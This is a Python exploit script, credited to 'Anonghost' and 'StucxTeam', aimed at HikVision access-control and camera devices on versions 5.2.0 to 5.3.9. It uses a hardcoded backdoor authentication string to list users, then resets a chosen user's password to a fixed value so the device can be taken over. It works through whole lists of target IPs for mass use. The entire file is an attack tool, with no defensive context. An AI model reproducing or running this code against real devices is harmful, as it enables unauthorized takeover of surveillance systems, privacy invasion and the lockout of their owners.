#!/usr/bin/env python

import requests
import re
import sys
import time

from colorama import Fore, Style

class Color:
    BRIGHT_RED           = Style.BRIGHT + Fore.RED
    BRIGHT_CYAN          = Style.BRIGHT + Fore.CYAN
    BRIGHT_WHITE         = Style.BRIGHT + Fore.WHITE
    BRIGHT_GREEN         = Style.BRIGHT + Fore.GREEN
    BRIGHT_YELLOW        = Style.BRIGHT + Fore.YELLOW
    BRIGHT_BLUE          = Style.BRIGHT + Fore.BLUE
    BRIGHT_LIGHTWHITE_EX = Style.BRIGHT + Fore.LIGHTWHITE_EX

def banners():
    print()
    print()
    print(Color.BRIGHT_LIGHTWHITE_EX + "        ████████╗██╗  ██╗███████╗     ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗███████╗██████╗ ███████╗")
    print(Color.BRIGHT_LIGHTWHITE_EX + "        ╚══██╔══╝██║  ██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝")
    print(Color.BRIGHT_LIGHTWHITE_EX + "           ██║   ███████║█████╗      ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██║ █╗ ██║███████║   ██║   ██║     ███████║█████╗  ██████╔╝███████╗")
    print(Color.BRIGHT_LIGHTWHITE_EX + "           ██║   ██╔══██║██╔══╝      ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██║███╗██║██╔══██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗╚════██║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "           ██║   ██║  ██║███████╗    ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║███████╗██║  ██║███████║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "           ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ╔══════════════════════════════════════════════════════════════════════════════════════╗")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "                          HikVision Access Control Exploit " +    Color.BRIGHT_LIGHTWHITE_EX + "                           ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║══════════════════════════════════════════════════════════════════════════════════════║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "                                  " + Color.BRIGHT_LIGHTWHITE_EX + "     ║" + Color.BRIGHT_YELLOW + "                Version Affected:" + Color.BRIGHT_LIGHTWHITE_EX + "             ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "                Author:              " + Color.BRIGHT_LIGHTWHITE_EX + "  ║" + Color.BRIGHT_LIGHTWHITE_EX + "                                              ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "              Anonghost☠︎" + Color.BRIGHT_LIGHTWHITE_EX + "               ║" + Color.BRIGHT_LIGHTWHITE_EX + "                                              ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "              StucxTeam" + Color.BRIGHT_LIGHTWHITE_EX + "                ║" + Color.BRIGHT_YELLOW + "             HikVision 5.2.0 - 5.3.9" + Color.BRIGHT_LIGHTWHITE_EX + "          ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "                             " + Color.BRIGHT_LIGHTWHITE_EX + "          ║" + Color.BRIGHT_YELLOW + " " + Color.BRIGHT_LIGHTWHITE_EX + "                                             ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ╚══════════════════════════════════════════════════════════════════════════════════════╝\n")

banners()

# BASIC INFO
newPass = "StucXCCTV@123"  # Password compliant with firmware requirements
BackdoorAuthArg = "auth=YWRtaW46MTEK"  # Authentication key

def usage():
    print("[i] Usage: python exploit.py [Port] [SSL (Y/N)] [Path to IP list file]")
    print("[i] Or run without args for interactive mode (manual file path or IP entry).")

def read_ips_from_file(file_path):
    """Read IP addresses from a text file."""
    try:
        with open(file_path, 'r') as file:
            # Read lines, strip whitespace, and filter out empty lines
            ips = [line.strip() for line in file if line.strip()]
        return ips
    except FileNotFoundError:
        print(f"[-] Error: The file {file_path} was not found.")
        return []
    except Exception as e:
        print(f"[-] Error reading file {file_path}: {str(e)}")
        return []

def parse_manual_ips(input_str):
    """Parse comma-separated IPs from manual input."""
    ips = [ip.strip() for ip in input_str.split(',') if ip.strip()]
    return ips

def validate_ip(ip):
    """Validate IP address format."""
    ipmatch = re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", ip)
    return bool(ipmatch)

def process_camera(ip, port, protocol):
    """Process a single camera IP for the backdoor exploit."""
    print(f"\n[+] Processing IP: {ip}")

    if not validate_ip(ip):
        print(f"[-] The IP address {ip} is not in the correct format.")
        return

    URLBase = f"{protocol}://{ip}:{port}/"  # URL base for requests
    URLDownload = f"{URLBase}Security/users?{BackdoorAuthArg}"  # Download request

    print(f"[+] Getting User List for {ip}.")

    try:
        # Fetch user list
        DownloadResponse = requests.get(URLDownload, timeout=5).text

        userID = ""
        userName = ""

        # Parse response for user ID and username
        for line in DownloadResponse.splitlines():
            useridmatch = re.search(r"<id>(.*)</id>", line)
            usernamematch = re.search(r"<userName>(.*)</userName>", line)

            if useridmatch:
                userID = useridmatch.group(1)
                print(f"[+] User ID: {userID}")
            if usernamematch:
                userName = usernamematch.group(1)
                print(f"[+] Username: {userName}")

        if not userID or not userName:
            print(f"[-] No valid user ID or username found for {ip}.")
            return

        # Prompt for user ID and username (or automate with defaults if desired)
        userID_input = input(f"[?] Which User ID would you like to use for {ip}? (Default: {userID}) ") or userID
        userName_input = input(f"[?] Which Username would you like to use for {ip}? (Default: {userName}) ") or userName

        print(f"[+] Using the User {userName_input} for {ip}.")

        # Craft XML payload
        userXML = (
            f'<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n'
            f'<id>{userID_input}</id>\r\n'
            f'<userName>{userName_input}</userName>\r\n'
            f'<password>{newPass}</password>\r\n'
            f'</User>'
        )

        URLUpload = f"{URLBase}Security/users/{userID_input}?{BackdoorAuthArg}"  # Upload request

        print(f"[+] Changing Password for {ip} now.")

        # Send the payload to update the password
        response = requests.put(URLUpload, data=userXML, timeout=5)
        print(response.text)

        print(f"[+] Complete. Please try logging in to {ip} with these credentials. Username: {userName_input}, Password: {newPass}")

    except requests.exceptions.RequestException as e:
        print(f"[-] Connection to {ip} failed! Error: {str(e)}")

def get_interactive_inputs():
    """Handle interactive prompts if args are missing."""
    print("[+] Entering interactive mode.")
    
    # Port
    while True:
        port_input = input("[?] Enter port (1-65535): ").strip()
        try:
            port = int(port_input)
            if 1 <= port <= 65535:
                break
            else:
                print("[-] Invalid port range.")
        except ValueError:
            print("[-] Port must be a number.")
    
    # SSL
    while True:
        ssl_input = input("[?] Use SSL? (Y/N): ").strip().upper()
        if ssl_input in ['Y', 'N']:
            break
        print("[-] Enter Y or N.")
    
    protocol = "https" if ssl_input == "Y" else "http"
    
    # IP source
    ip_list = []
    while not ip_list:
        choice = input("[?] Enter 'F' for file path or 'M' for manual IP list (comma-separated): ").strip().upper()
        if choice == 'F':
            file_path = input("[?] Enter path to IP list file: ").strip()
            ip_list = read_ips_from_file(file_path)
        elif choice == 'M':
            manual_input = input("[?] Enter IPs (comma-separated, e.g., 192.168.1.1,192.168.1.2): ").strip()
            ip_list = parse_manual_ips(manual_input)
        else:
            print("[-] Invalid choice.")
    
    return port, protocol, ip_list

def main():
    # Parse command-line arguments if provided
    if len(sys.argv) == 4:
        try:
            port = int(sys.argv[1])
            SSL = sys.argv[2].upper()
            file_path = sys.argv[3]
        except ValueError:
            print(f"[-] The entered port {sys.argv[1]} is not a number.")
            usage()
            sys.exit(1)

        if port <= 0 or port > 65535:
            print(f"[-] The entered port {port} is not a valid port number.")
            usage()
            sys.exit(1)

        if SSL not in ['Y', 'N']:
            print("[-] SSL must be Y or N.")
            usage()
            sys.exit(1)

        protocol = "https" if SSL == "Y" else "http"

        ip_list = read_ips_from_file(file_path)
        if not ip_list:
            print("[-] No IPs to process. Exiting.")
            sys.exit(1)
    else:
        # Interactive mode
        if len(sys.argv) > 1:
            print("[-] Incomplete arguments. Switching to interactive mode.")
        port, protocol, ip_list = get_interactive_inputs()

    print(f"[+] Found {len(ip_list)} IP(s) to process.")

    # Process each IP
    for ip in ip_list:
        process_camera(ip, port, protocol)
        time.sleep(1)  # Add delay to avoid overwhelming servers

if __name__ == "__main__":
    main()
